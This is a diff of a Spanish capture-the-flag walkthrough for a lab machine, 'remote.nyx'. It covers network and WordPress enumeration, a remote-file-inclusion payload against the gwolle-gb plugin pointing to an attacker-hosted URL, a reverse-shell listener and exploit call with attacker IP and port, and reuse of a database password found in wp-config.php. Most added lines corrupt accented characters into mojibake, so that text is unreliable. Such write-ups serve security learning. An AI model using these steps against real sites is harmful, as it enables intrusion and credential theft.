@@ -12,7 +12,7 @@ Fecha: 2026-02-23
 Empezaremos con un reconocimiento de red para ver la IP de este laboratorio.
 
 ```bash
- sudo arp-scan -I eth0 --localnet
+¯é░ sudo arp-scan -I eth0 --localnet
 Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
 WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
@@ -25,14 +25,14 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.963 seconds (130.41 hosts/sec). 3 responded
 ```
 
-Como podemos observar la IP es ***10.0.11.12*** así que empezaremos con el reconocimiento de puertos y servicios.
+Como podemos observar la IP es ***10.0.11.12*** as├¡ que empezaremos con el reconocimiento de puertos y servicios.
 
 ```bash
- settarget 10.0.11.12            
+¯é░ settarget 10.0.11.12            
 TARGET establecido: 10.0.11.12
 
- gomap -s $TARGET
-🎯 Scanning 10.0.11.12 (997 ports)
+¯é░ gomap -s $TARGET
+­ƒÄ» Scanning 10.0.11.12 (997 ports)
 
 PORT    STATE  SERVICE         VERSION
 22      open   ssh             SSH-2.0 - OpenSSH 8.4p1 Debian-5+deb11u1
@@ -41,19 +41,19 @@ PORT    STATE  SERVICE         VERSION
 Host Exposure Summary
 - 10.0.11.12 | open ports: 2 | critical: ssh | exposure: medium
 
-✓ Completed scan in 52ms | hosts: 1 | open ports: 2
+Ô£ô Completed scan in 52ms | hosts: 1 | open ports: 2
 ```
 
 Solo tenemos 2 puertos abiertos:
-- 22 - Conexión mediante SSH
+- 22 - Conexi├│n mediante SSH
 - 80 - Protocolo HTTP para servicios web
 
 Vamos a ver que tenemos en la web de este laboratorio.
 
-Nos encontramos con la pagina por defecto de Apache, así que tendremos que realizar una enumeración de directorios a ver que encontramos.
+Nos encontramos con la pagina por defecto de Apache, as├¡ que tendremos que realizar una enumeraci├│n de directorios a ver que encontramos.
 
 ```bash
- dirb http://$TARGET
+¯é░ dirb http://$TARGET
 
 -----------------
 DIRB v2.22    
@@ -76,14 +76,14 @@ GENERATED WORDS: 4612
 <skip>
 ```
 
-Bueno, parece que estamos frente a un *Wodpress* así que vamos a mirar la web a ver si podemos ver algo interesante que podamos usar.
+Bueno, parece que estamos frente a un *Wodpress* as├¡ que vamos a mirar la web a ver si podemos ver algo interesante que podamos usar.
 
 <img width="268" height="312" alt="Pasted image 20260223110618" src="https://github.com/user-attachments/assets/cc1df6fc-b176-48f6-bdd6-b0732f1eda40" />
 
-Curiosamente solo nos aparece texto de mala manera, esto indica que estamos frente a un dominio, al pasar el ratón por encima de *¡Hello World!* vemos que el dominio es **remote.nyx**. ahora tendremos que añadirlo a nuestro */etc/hosts*.
+Curiosamente solo nos aparece texto de mala manera, esto indica que estamos frente a un dominio, al pasar el rat├│n por encima de *┬íHello World!* vemos que el dominio es **remote.nyx**. ahora tendremos que a├▒adirlo a nuestro */etc/hosts*.
 
 ```bash
- sudo nano /etc/hosts
+¯é░ sudo nano /etc/hosts
 
 127.0.0.1       localhost
 127.0.1.1       jd-sec.intracof.local   jd-sec
@@ -96,15 +96,15 @@ ff02::2 ip6-allrouters
 10.0.11.12 remote.nyx
 ```
 
-Ahora podemos ver la web en condiciones pero solo encontramos un usuario **tiago** por ende trataremos de realizar una enumeración de este CMS para buscar vectores de ataque.
+Ahora podemos ver la web en condiciones pero solo encontramos un usuario **tiago** por ende trataremos de realizar una enumeraci├│n de este CMS para buscar vectores de ataque.
 
 ```bash
- wpscan --url http://remote.nyx/wordpress/ -e u,p --plugins-detection aggressive
+¯é░ wpscan --url http://remote.nyx/wordpress/ -e u,p --plugins-detection aggressive
 
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ┬«
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
             \  /\  /  | |     ____) | (__| (_| | | | |
              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
@@ -158,19 +158,19 @@ _______________________________________________________________
 
 Vemos que hay un plugin vulnerable llamado **qwolle-gb** y el usuario **tiago** como ya vimos antes.
 
-Buscaremos información del plugin a ver si no es necesario iniciar sesión para explotar las vulnerabilidades.
+Buscaremos informaci├│n del plugin a ver si no es necesario iniciar sesi├│n para explotar las vulnerabilidades.
 
-En la web de [Explot Database](https://www.exploit-db.com/exploits/38861) encontramos que este plugin es vulnerable a un Remote File Inclusión (RFI) y nos indica la forma de proceder.
+En la web de [Explot Database](https://www.exploit-db.com/exploits/38861) encontramos que este plugin es vulnerable a un Remote File Inclusi├│n (RFI) y nos indica la forma de proceder.
 
 ```txt
 http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
 ```
 
-Así mismo hay exploit en *GitHub* que ayudan a automatizar esta explotación.
+As├¡ mismo hay exploit en *GitHub* que ayudan a automatizar esta explotaci├│n.
 
 [CVE-2015-8351](https://github.com/NexusFireMan/Exploits/tree/main/CVE-2015-8351)
 
-Pero yo utilizare el siguiente código.
+Pero yo utilizare el siguiente c├│digo.
 
 ```python
 import requests
@@ -241,18 +241,18 @@ if __name__ == "__main__":
 Primero tendremos que tener a la escucha nuestro equipo.
 
 ```bash
- penelope -p 443                 
-[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.11.11 • 172.17.0.1
-➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+¯é░ penelope -p 443                 
+[+] Listening for reverse shells on 0.0.0.0:443 ÔåÆ  127.0.0.1 ÔÇó 10.0.11.11 ÔÇó 172.17.0.1
+Ô×ñ  ­ƒÅá Main Menu (m) ­ƒÆÇ Payloads (p) ­ƒöä Clear (Ctrl-L) ­ƒÜ½ Quit (q/Ctrl-C)
 ```
 
 Una vez a la escucha ejecutamos el exploit para tener acceso a la maquina victima.
 
 ```bash
- python3 exploit.py http://remote.nyx/wordpress 10.0.11.11 443 8000
+¯é░ python3 exploit.py http://remote.nyx/wordpress 10.0.11.11 443 8000
 ```
 
-Este exploit solicita la dirección donde se encuentra *Wordpress*, después la *ip de atacante*, el *puerto de atacante* y por ultimo el *puerto donde se servirá el payload*.
+Este exploit solicita la direcci├│n donde se encuentra *Wordpress*, despu├®s la *ip de atacante*, el *puerto de atacante* y por ultimo el *puerto donde se servir├í el payload*.
 
 Con esto ya tendremos acceso a la maquina objetivo.
 
@@ -262,14 +262,14 @@ Ahora toca la escalada de privilegios, empecemos a probar.
 www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -l
 ```
 
-Al ejecutar este comando nos pide contraseña, por este vector no podemos hacer nada.
+Al ejecutar este comando nos pide contrase├▒a, por este vector no podemos hacer nada.
 
 ```bash
 www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ ls /home/
 tiago
 ```
 
-Curiosamente tenemos un usuario con el mismo nombre que en *wordpress* esto nos puede dar indicios de una *reutilización de contraseña* así que en otro terminal intentaremos encontrar la contraseña de este usuario y ademas en la actual buscaremos si existe algún *SUID*.
+Curiosamente tenemos un usuario con el mismo nombre que en *wordpress* esto nos puede dar indicios de una *reutilizaci├│n de contrase├▒a* as├¡ que en otro terminal intentaremos encontrar la contrase├▒a de este usuario y ademas en la actual buscaremos si existe alg├║n *SUID*.
 
 ```bash
 www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ find / -perm -4000 2>/dev/null 
@@ -286,15 +286,15 @@ www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/ca
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-Estos fichero no tienen un uso relevante para la escalada de privilegios, pero *ssh-keysign* puede ser interesante, probemos otras vías antes.
+Estos fichero no tienen un uso relevante para la escalada de privilegios, pero *ssh-keysign* puede ser interesante, probemos otras v├¡as antes.
 
 ```bash
- wpscan --url http://remote.nyx/wordpress/ -U tiago -P /usr/share/wordlists/rockyou.txt
+¯é░ wpscan --url http://remote.nyx/wordpress/ -U tiago -P /usr/share/wordlists/rockyou.txt
 ```
 
 El ataque de diccionario no ha tenido el efecto deseado y por consiguiente continuamos con otra tarea.
 
-Una de las tareas mas comunes es mirar el fichero *wp-config.php*  por si hay información relevante, solemos encontrar credenciales de bases de datos que nos pueden permitir intentar una reutilización de contraseñas.
+Una de las tareas mas comunes es mirar el fichero *wp-config.php*  por si hay informaci├│n relevante, solemos encontrar credenciales de bases de datos que nos pueden permitir intentar una reutilizaci├│n de contrase├▒as.
 
 ```bash
 www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ cat /var/www/html/wordpress/wp-config.php
@@ -314,7 +314,7 @@ define( 'DB_PASSWORD', 'WPr00t3d123!' );
 <skip>
 ```
 
-Ahora tenemos una contraseña así que tendremos que probar si nos sirve.
+Ahora tenemos una contrase├▒a as├¡ que tendremos que probar si nos sirve.
 
 ```bash
 www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ su tiago
@@ -322,7 +322,7 @@ Password:
 tiago@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ 
 ```
 
-Parece que esta contraseña nos ha servido para hacer un movimiento lateral al usuario *tiago*.
+Parece que esta contrase├▒a nos ha servido para hacer un movimiento lateral al usuario *tiago*.
 
 ```bash
 tiago@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -l
